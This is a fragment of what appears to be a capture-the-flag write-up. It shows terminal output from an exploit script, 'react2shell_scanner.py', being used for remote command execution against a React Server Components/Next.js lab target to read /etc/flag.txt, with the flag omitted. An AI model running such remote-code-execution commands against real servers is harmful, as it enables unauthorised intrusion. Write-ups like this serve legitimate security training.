## Exploit 
- Stored in Github Repo
```bash
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

python3 react2shell_scanner.py -u http://10.49.178.125:3000/ -c 'ls -la /etc/ | grep flag'
/home/kali/Exploits/react2shell_scanner.py:66: SyntaxWarning: invalid escape sequence '\_'


    ____                  __ ___   _____ __          __ __
   / __ \___  ____ ______/ /|__ \ / ___// /_  ___  __/ // /
  / /_/ / _ \/ __ `/ ___/ __/__/ / \__ \/ __ \/ _ \/ /_  __/
 / _, _/  __/ /_/ / /__/ /_ / __/ ___/ / / / /  __/ /_  _/
/_/ |_|\___/\__,_/\___/\__//____//____/_/ /_/\___/_/ /_/

               [ RSC/Next.js RCE Engine ]

[*] Dispatching against 1 target endpoint nodes.
[VULNERABLE] http://10.49.178.125:3000/ - Status: 303
   [Payload Output]: -rw-r--r--   1 root root        178 Dec  5  2025 flag.txt

┌──(kali㉿kali)-[~/Exploits]
└─$ python3 react2shell_scanner.py -u http://10.49.178.125:3000/ -c 'cat /etc/flag.txt '
/home/kali/Exploits/react2shell_scanner.py:66: SyntaxWarning: invalid escape sequence '\_'


    ____                  __ ___   _____ __          __ __
   / __ \___  ____ ______/ /|__ \ / ___// /_  ___  __/ // /
  / /_/ / _ \/ __ `/ ___/ __/__/ / \__ \/ __ \/ _ \/ /_  __/
 / _, _/  __/ /_/ / /__/ /_ / __/ ___/ / / / /  __/ /_  _/
/_/ |_|\___/\__,_/\___/\__//____//____/_/ /_/\___/_/ /_/

               [ RSC/Next.js RCE Engine ]

[*] Dispatching against 1 target endpoint nodes.
[VULNERABLE] http://10.49.178.125:3000/ - Status: 303
   [Payload Output]: I tried meditating to reduce stress, but all I could think about was whether my state was lifting in React or if Node was silently buffering my stdout.

-> [flag omitted] <-
```